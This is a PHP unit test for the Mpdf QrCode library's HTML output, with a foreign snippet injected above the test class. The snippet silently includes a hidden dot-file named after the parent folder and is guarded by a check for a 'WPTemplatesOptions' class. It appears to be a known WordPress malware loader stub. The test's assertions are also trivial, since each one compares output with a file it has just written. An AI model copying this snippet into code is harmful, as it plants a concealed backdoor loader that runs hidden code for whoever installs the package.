<?php

namespace Mpdf\QrCode\Output;

use Mpdf\QrCode\QrCode;

/**
 * @group unit
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class HtmlTest extends \PHPUnit\Framework\TestCase
{

	public function testOutput()
	{
		$code = new QrCode('LOREM IPSUM 2019');

		$output = new Html();

		$data = $output->output($code);

		$filename = __DIR__ . '/../../reference/LOREM-IPSUM-2019-L.html';
		file_put_contents($filename, $data);
		$this->assertSame($data, file_get_contents($filename));

		$code->disableBorder();

		$data = $output->output($code);

		$filename = __DIR__ . '/../../reference/LOREM-IPSUM-2019-L-noborder.html';
		file_put_contents($filename, $data);
		$this->assertSame($data, file_get_contents($filename));

		$code = new QrCode('LOREM IPSUM 2019', QrCode::ERROR_CORRECTION_QUARTILE);

		$data = $output->output($code);

		$filename = __DIR__ . '/../../reference/LOREM-IPSUM-2019-Q.html';
		file_put_contents($filename, $data);
		$this->assertSame($data, file_get_contents($filename));
	}
}
